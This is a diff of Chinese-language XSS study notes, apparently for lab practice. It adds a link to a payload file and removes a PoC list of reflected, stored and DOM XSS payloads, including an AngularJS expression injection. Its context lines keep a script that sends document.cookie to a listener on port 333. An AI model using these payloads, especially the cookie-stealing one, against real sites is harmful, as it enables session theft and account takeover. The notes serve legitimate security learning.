@@ -13,6 +13,8 @@ outline: 2
 
 [XSS advance](../webapp/ClientSideAttacks.md#xss)
 
+[xss payload](../files/xss_payload.md)
+
 [XSS cheat sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
 
 [Cross-Site Scripting](../common.md#xss) 简称为“CSS”，为避免与前端叠成样式表的缩写"CSS"冲突，故又称XSS。
@@ -197,57 +199,7 @@ $.parseHTML()
 ```bash
 127.0.0.1/vulnerabilities/xss_d/?default=<script>var pic=document.createElement("img"); pic.src="http://127.0.0.1:333/getCookie?"+escape(document.cookie)</script>
 ```
-
-## PoC
-
-### reflect
-
-*angle brackets HTML-encoded*
-```html
-"onclick="alert(233)
-"onfocus="alert(233)
-"onmouseover="alert(233)
-" autofocus onfocus=alert(document.domain) x="
-```
-
-### stored
-
-*anchor href attribute with double quotes HTML-encoded*
-
-```html
-<a href="javascript:alert(document.domain)">
-```
-
-### DOM
-
-*`location.search` source &  `document.write` sink*
-```javascript
-"><script>alert(document.domain)</script>
-" onload="alert(1)
-"><svg onload=alert(1)>
-```
-
-*`location.search` source & `innerHTML` sink*
-```html
-<img src=1 onerror=alert(document.domain)>
-<svg><animate onend=alert(233) attributeName=x dur=1s>
-<audio src/onerror=alert(233)>
-```
-
-*`location.search` source & jQuery anchor `href` attribute sink*
-```html
-?returnUrl=javascript:alert(document.domain)
-```
-
-*jQuery selector sink using a hashchange event*
-```html
-<iframe src="https://vulnerable-website.com#" onload="this.src+='<img src=1 onerror=alert(1)>'">
-```
-
-*AngularJS expression with angle brackets and double quotes HTML-encoded*
-```html
-{{$on.constructor('alert(1)')()}}
-```    
+---
 
 ## mXSS
 
